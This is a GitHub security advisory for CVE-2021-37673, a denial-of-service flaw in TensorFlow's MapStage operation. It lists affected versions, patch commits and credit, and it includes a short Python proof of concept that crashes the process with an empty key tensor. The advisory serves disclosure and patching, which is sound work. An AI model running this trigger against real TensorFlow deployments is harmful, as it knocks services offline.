# [M] `CHECK`-fail in `MapStage`

## Summary
Severity: Medium
Advisory: GHSA-278g-rq84-9hmg
CVE: CVE-2021-37673
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2021-08-25
Source: https://github.com/advisories/GHSA-278g-rq84-9hmg
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.3.4
- PyPI: `tensorflow` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-cpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-gpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.1

## Details
### Impact
An attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.MapStage`:

```python
import tensorflow as tf
  
tf.raw_ops.MapStage(
  key=tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64),
  indices=tf.constant((0), dtype=tf.int32),
  values=[tf.constant((0), dtype=tf.int32)],
  dtypes=[tf.int32,
  tf.int64],
  capacity=0,
  memory_limit=0,
  container='',
  shared_name='')
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/map_stage_op.cc#L513) does not check that the `key` input is a valid non-empty tensor.
  
### Patches
We have patched the issue in GitHub commit [d7de67733925de196ec8863a33445b73f9562d1d](https://github.com/tensorflow/tensorflow/commit/d7de67733925de196ec8863a33445b73f9562d1d).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security  guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-278g-rq84-9hmg
- https://nvd.nist.gov/vuln/detail/CVE-2021-37673
- https://github.com/tensorflow/tensorflow/commit/d7de67733925de196ec8863a33445b73f9562d1d
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-586.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-784.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-295.yaml
- https://github.com/tensorflow/tensorflow
